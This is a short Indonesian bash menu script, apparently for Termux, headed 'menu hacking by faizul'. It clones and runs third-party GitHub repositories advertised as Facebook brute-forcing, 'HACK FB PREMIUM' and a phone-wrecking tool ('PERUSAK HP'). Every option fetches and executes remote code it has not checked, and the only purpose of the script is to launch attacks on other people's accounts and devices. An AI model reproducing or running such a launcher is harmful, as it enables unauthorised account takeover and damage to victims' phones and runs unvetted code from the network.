clear
sleep 5
bi='\033[34;1m' #biru
ij='\033[32;1m' #ijo
pr='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
or='\033[1;38;5;208m' #Orange
clear
sleep 1
echo $purple "
█████████
\033[1;93m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;93m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;93m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mtools-Dark
\033[1;93m█████████      \033[1;92m«----------✧----------»
\033[1;93m ██ ██"
echo $cy "
┏━━━━━┫{✔ menu hacking by faizul ✔}┣━━━━━┓
┃
┠──[1]✔ BRUTE FV
┃
┠──[2]✔ HACK FB PREMIUM
┃
┠──[3]✔ PERUSAK HP
┠
┠──[4]✔ 
┗────[5] exit ✘"
echo '\033[35;1m'
read -p "root@Pilih Nomor > " bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
sleep 2
clear
pkg install git
git clone https://github.com/MRA27/FBNEWV2
cd FBNEWV2
python2 MRA27.py
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
sleep 2
clear
pkg install git
git clone https://github.com/Bl4ckDr460n/Black-Fb-Premium
cd Black-Fb-Premium
python2 Black-Fb.py
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
sleep 2
clear
git clone https://github.com/justahackers/perusak
cd perusak
python2 perusak.py
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
echo $cyan  "Subscribe Channel Htc Ctr Gaming "
sleep 2
exit
fi
